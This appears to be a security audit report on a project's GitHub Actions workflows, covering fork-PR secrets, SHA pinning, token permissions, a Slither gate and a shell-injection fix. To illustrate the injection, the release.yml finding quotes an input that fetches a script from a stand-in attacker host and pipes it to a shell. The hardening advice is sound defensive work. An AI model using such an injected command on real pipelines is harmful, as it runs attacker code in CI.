## HIGH — `ci.yml:67` WalletConnect secret in fork PRs

**Risk:** `VITE_WALLETCONNECT_PROJECT_ID` is `${{ secrets.* }}`. On a fork-originated
PR, GitHub does not normally expose secrets — but as a defense-in-depth measure
we now explicitly skip secret injection for fork PRs and run a parallel build
step without the secret. This guarantees no path where a malicious PR can
exfiltrate the WC ID via a build-time hook.

**Fix:** Two `build` step variants gated on
`github.event.pull_request.head.repo.full_name == github.repository`:
- Trusted context (push or in-repo PR): build **with** `VITE_WALLETCONNECT_PROJECT_ID`.
- Fork PR: build **without** the env var. Non-wallet flows still verify cleanly.

```yaml
- name: Build (with WalletConnect, trusted context)
  if: |
    github.event_name == 'push' ||
    (github.event_name == 'pull_request' &&
     github.event.pull_request.head.repo.full_name == github.repository)
  run: npm run build
  env:
    VITE_WALLETCONNECT_PROJECT_ID: ${{ secrets.VITE_WALLETCONNECT_PROJECT_ID }}

- name: Build (no WalletConnect, fork PR)
  if: |
    github.event_name == 'pull_request' &&
    github.event.pull_request.head.repo.full_name != github.repository
  run: npm run build
```

## HIGH — Floating action tags (supply-chain)

**Risk:** Floating tags (`@v4`, `@v1`, `@v2`) can be force-moved by an attacker
who compromises a maintainer's GitHub credentials, silently injecting code into
every CI run. SLSA / StepSecurity / Dependabot (`dependabot.yml` immutable-action
update strategy) all recommend SHA pinning.

**Fix:** Replaced every `uses: foo@vX` with `uses: foo@<40-char-sha> # vX.Y.Z`.
SHAs were resolved against the GitHub Git refs API (e.g.
`api.github.com/repos/<owner>/<repo>/git/refs/tags/<tag>`).

## MED — `release.yml` shell injection via `workflow_dispatch.tag`

**Risk:** Old code `echo "value=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"`
interpolates the tag directly into a bash heredoc. A maliciously-crafted dispatch
input like `v1.0.0\n$(curl evil.com/x|sh)` would be executed before the regex
filter fires.

**Fix:**
1. Added an explicit pre-flight validator job step that fails the workflow if
   the dispatch input doesn't match
   `^v[0-9]+\.[0-9]+\.[0-9]+(-(rc|beta|alpha|pre)\.[0-9]+)?$` (strict semver).
2. Replaced every `${{ inputs.tag }}` / `${{ steps.tag.outputs.value }}` in `run:`
   blocks with **env-passthrough** (`env: TAG: ${{ ... }}` then `"$TAG"` quoted).
   This means GitHub Actions writes the value into the process environment as
   a single token, never re-evaluated by bash.
3. Re-validates in the resolve-tag step as a defensive belt-and-braces.
4. `tar -czf` and the release-notes heredoc both use `"${TAG}"` (quoted, env).

## MED — `release.yml` workflow-scope `contents: write`

**Risk:** Workflow-scope `permissions: contents: write` grants the token to
every job in the workflow, even ones that only `forge build`. Compromise of
a build step (e.g. via a malicious dependency) could push tags or rewrite history.

**Fix:** Reduced workflow-scope to `permissions: contents: read`. The single
`release` job opts in with its own `permissions: contents: write` block. This
matches the pattern already used in `slither.yml` and `codeql.yml`.

## LOW — `slither.yml` `fail-on: none`

**Risk:** Slither was producing SARIF for the GitHub Security tab but never
blocking merges. Medium-severity findings could land on `main` unnoticed.

**Fix:** `fail-on: medium` — PRs fail if Slither reports medium/high. False
positives can be muted with inline `// slither-disable-next-line <detector>`.
